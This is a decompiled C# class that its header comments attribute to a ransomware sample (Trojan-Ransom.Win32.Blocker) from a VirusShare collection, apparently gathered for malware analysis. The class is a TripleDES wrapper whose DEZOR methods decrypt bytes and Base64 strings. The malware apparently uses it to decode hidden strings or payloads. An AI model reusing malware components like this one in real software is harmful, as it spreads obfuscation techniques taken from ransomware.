// Decompiled with JetBrains decompiler
// Type: AMGWUTISTHIS.cTripleDES
// Assembly: AMGWUTISTHIS, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2C85C05D-64D7-46DB-BCB4-D8785356FD4C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00019-msil\Trojan-Ransom.Win32.Blocker.ikgt-4a98d8406df84b25ff3f71f91f50a0ad239b232e12be0951038a5e63a25e6b1b.exe

using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace AMGWUTISTHIS
{
  internal class cTripleDES
  {
    private TripleDESCryptoServiceProvider m_des;
    private UTF8Encoding m_utf8;
    private byte[] m_key;
    private byte[] m_iv;

    public cTripleDES(byte[] key, byte[] iv)
    {
      this.m_des = new TripleDESCryptoServiceProvider();
      this.m_utf8 = new UTF8Encoding();
      this.m_key = key;
      this.m_iv = iv;
    }

    public byte[] DEZOR(byte[] input) => this.Transform(input, this.m_des.CreateDecryptor(this.m_key, this.m_iv));

    public string DEZOR(string text) => this.m_utf8.GetString(this.Transform(Convert.FromBase64String(text), this.m_des.CreateDecryptor(this.m_key, this.m_iv)));

    private byte[] Transform(byte[] input, ICryptoTransform CryptoTransform)
    {
      MemoryStream memoryStream = new MemoryStream();
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, CryptoTransform, CryptoStreamMode.Write);
      cryptoStream.Write(input, 0, input.Length);
      cryptoStream.FlushFinalBlock();
      memoryStream.Position = 0L;
      byte[] buffer = new byte[checked ((int) (memoryStream.Length - 1L) + 1)];
      memoryStream.Read(buffer, 0, buffer.Length);
      memoryStream.Close();
      cryptoStream.Close();
      return buffer;
    }
  }
}
